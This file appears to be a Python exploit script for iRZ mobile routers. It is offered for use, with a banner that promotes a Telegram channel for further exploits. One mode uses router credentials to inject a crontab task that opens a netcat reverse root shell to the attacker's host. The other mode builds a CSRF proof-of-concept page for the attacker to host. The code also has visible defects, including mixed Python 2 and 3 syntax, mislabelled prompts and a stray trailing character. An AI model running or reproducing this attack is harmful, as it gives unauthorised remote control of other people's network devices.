# Exploit Title: iRZ Mobile Router - CSRF to RCE
import os
import requests
import json
import subprocess

option = "0"


def main():
print """

   ______          __     ____                 
  / ____/___  ____/ /__  / __ )____  __________
 / /   / __ \/ __  / _ \/ __  / __ \/ ___/ ___/
/ /___/ /_/ / /_/ /  __/ /_/ / /_/ (__  |__  ) 
\____/\____/\__,_/\___/_____/\____/____/____/  
   CSRF TO RCE
   
   For More Famous Tools And Exploit Join Here
    t.me/codeboss503

"""
"""
[ 1 ] CSRF TO RCE Need { Needs Credential } + [ Exploit One ]
[ 2 ] CSRF TO RCE No Need { Credentials } + [ Exploit Two ]
"""
run()


def run():
    option = input(" - Choice One --> : ")
    if option == "1":
        exploit1()
    elif option == "2":
        exploit2()
    else:
        print(" - Exited")


def exploit1():
    print()
    print(" - Running To Exploit One")
    
    router_ip = input(" - Give Me The Router IP --> : ")
    router_port = int(
        input(" - Give Me The Victim IP Port Default [80/443] --> : ") or "80" or "443")

    router_user = input(" - Give Me The Router UserName --> : ")
    router_pass = input(" - Give Me The Router PassWord --> : ")

    LHOST = input(" - Give Me The Root Shell Port --> : ")
    LPORT = input(" - Give Me The Root Shell Port --> : ")

    router_url = f'http://{router_ip}:{router_port}'

    nc1_str = f'CommanD --> [ nc -lvp ] {LPORT}'

    input(nc1_str + " - Completely Done")

    send_json_payload(router_url, router_user, router_pass, LHOST, LPORT)


def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port):

    intro = f'Sending the payload to {router_url}\n'
    print(intro)
    payload_str = '{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
        f'{lhost_ip} {lhost_port} ' + \
        '>/tmp/f"}],"_board":{"name":"RL21","platform":"irz_mt02","time":"Wed Mar 16 16:43:20 UTC 2022"}}'

    payload_json = json.loads(payload_str)

    s = requests.Session()

    s.auth = (router_user, router_pass)

    s.headers.update(
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"})
    s.headers.update({"X-Requested-With": "XMLHttpRequest"})
    s.headers.update({"Origin": router_url})
    s.headers.update({"Referer": router_url})

    s.post(router_url + "/api/crontab", json=payload_json)

    exploit_str = f'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} 443 >/tmp/f'

    print(
        "Request sent! You may have to wait about 2 minutes to get a shell. \nFirst shell will die due to crontab job. Start a new listener on a new port [e.g. 443], and run the following command: " + exploit_str)
    print("To fix TTY: type telnet 0.0.0.0 in the shell")


def exploit2():

    print()
    print(" - Running To Exploit One")
    
    router_ip = input(" - Give Me The Router IP --> : ")
    router_port = int(
        input(" - Give Me The Victim IP Port Default [80/443] --> : ") or "80" or "443")

    LHOST = input(" - Give Me The Root Shell Port --> : ")
    LPORT = input(" - Give Me The Root Shell Port --> : ")

    load_csrf_poc_file(router_ip, router_port, LHOST, LPORT)


def load_csrf_poc_file(router_ip, router_port, lhost_ip, lhost_port):

    file_path = os.path.dirname(__file__) + os.sep + "poc.template.html"

    if os.path.isfile(file_path):
        with open(file_path) as poc_file:
            original_poc_data_str = poc_file.read()

            new_html = original_poc_data_str.replace("{router_ip}", router_ip)
            new_html = new_html.replace(
                "{router_port}", str(router_port))

            lhost_split_arr = lhost_ip.split(".")

            if len(lhost_split_arr) == 4:

                new_html = new_html.replace(
                    "{lhost_ip_octect_1}", lhost_split_arr[0])

                new_html = new_html.replace(
                    "{lhost_ip_octect_2}", lhost_split_arr[1])

                new_html = new_html.replace(
                    "{lhost_ip_octect_3}", lhost_split_arr[2])
                new_html = new_html.replace(
                    "{lhost_ip_octect_4}", lhost_split_arr[3])

                new_html = new_html.replace(
                    "{lhost_port}", lhost_port)

                new_file_path = os.path.dirname(
                    __file__) + os.sep + "poc.new.html"
                try:
                    with open(new_file_path, 'w') as new_file:
                        new_file.write(new_html)

                    print()
                    print(
                        f'New file written to {new_file_path}. Host this file')
                except FileNotFoundError:
                    print(" - Don`t Found")
            else:
                print(f'{lhost_ip} --> NoT_VuLn')

    else:
        print(f'{file_path} --> InValid')


main()
            E
  
